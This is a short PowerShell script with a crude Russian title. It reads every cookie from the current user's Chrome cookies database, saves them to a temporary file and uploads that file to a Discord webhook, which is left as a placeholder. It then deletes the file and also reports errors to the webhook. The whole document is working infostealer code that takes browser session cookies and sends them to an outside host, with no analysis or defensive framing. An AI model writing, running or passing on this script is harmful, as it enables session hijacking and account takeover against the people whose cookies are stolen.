# хуй хуй

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# Get the current user's username and construct the path to Chrome's cookies database
$username = $env:USERNAME
$chromePath = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\Cookies"

# Check if the Cookies file exists
if (Test-Path $chromePath) {
    try {
        # Load the SQLite assembly (assumes System.Data.SQLite.dll is available)
        [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite") | Out-Null

        # Create a connection to the SQLite database
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$chromePath;Version=3;")
        $conn.Open()

        # Create a command to query all cookies
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT host_key, name, value FROM cookies"

        # Execute the query and read the results
        $reader = $cmd.ExecuteReader()
        $cookieData = @()
        while ($reader.Read()) {
            $cookieData += "Host: " + $reader["host_key"] + ", Name: " + $reader["name"] + ", Value: " + $reader["value"]
        }

        # Close the connection
        $reader.Close()
        $conn.Close()

        # Save the cookie data to a text file
        $outputFile = "$env:TEMP\cookies.txt"
        $cookieData | Out-File -FilePath $outputFile -Encoding UTF8

        # Prepare the form data to send the file to the Discord webhook
        $fileContent = Get-Content -Path $outputFile -Raw
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = "--$boundary`r`n" +
                "Content-Disposition: form-data; name=`"file`"; filename=`"cookies.txt`"`r`n" +
                "Content-Type: text/plain`r`n`r`n" +
                $fileContent + "`r`n" +
                "--$boundary--`r`n"

        # Send the file to the Discord webhook
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body

        # Clean up the temporary file
        Remove-Item -Path $outputFile
    }
    catch {
        # Send error message to the webhook with proper JSON formatting
        $errorMessage = "Error: " + $_.ToString()
        $jsonBody = @{content=$errorMessage} | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
    }
}
else {
    # If the Cookies file is not found, send a message to the webhook with proper JSON formatting
    $message = "Chrome cookies file not found for user $username"
    $jsonBody = @{content=$message} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
}
